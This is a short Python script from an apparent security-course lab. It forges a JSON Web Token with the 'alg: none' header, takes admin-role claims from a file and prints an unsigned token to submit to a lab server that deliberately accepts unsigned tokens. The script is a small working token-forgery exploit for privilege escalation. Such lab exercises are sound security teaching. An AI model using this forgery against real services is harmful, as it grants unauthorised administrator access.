"""M03: JWT `alg: none` only when the validator is broken.

This lab explicitly says the server accepts unsigned JWTs.
In a proper implementation this is NOT accepted.
The third JWT section is EMPTY in THIS exercise, unlike some past CNS labs.
"""
import base64
import json
from pathlib import Path
HERE=Path(__file__).resolve().parent

def base64url_encode(data):
    # JWT removes trailing '=' padding characters.
    return base64.urlsafe_b64encode(data).decode('ascii').rstrip('=')

def encode_object(obj):
    # Compact JSON avoids extra spaces (the signature would change).
    text=json.dumps(obj,separators=(',',':'))
    return base64url_encode(text.encode('utf-8'))

def main():
    old_token=(HERE/'guest_jwt.txt').read_text().strip()
    print('Original header encoded:',old_token.split('.')[0])
    header={'alg':'none','typ':'JWT'}
    claims=json.loads((HERE/'claims.json').read_text())
    # This lab expects sub='guest-007', role='admin'.
    forged=encode_object(header)+'.'+encode_object(claims)+'.'
    print('SUBMIT:',forged)
    assert forged.endswith('.')

if __name__=='__main__':
    main()
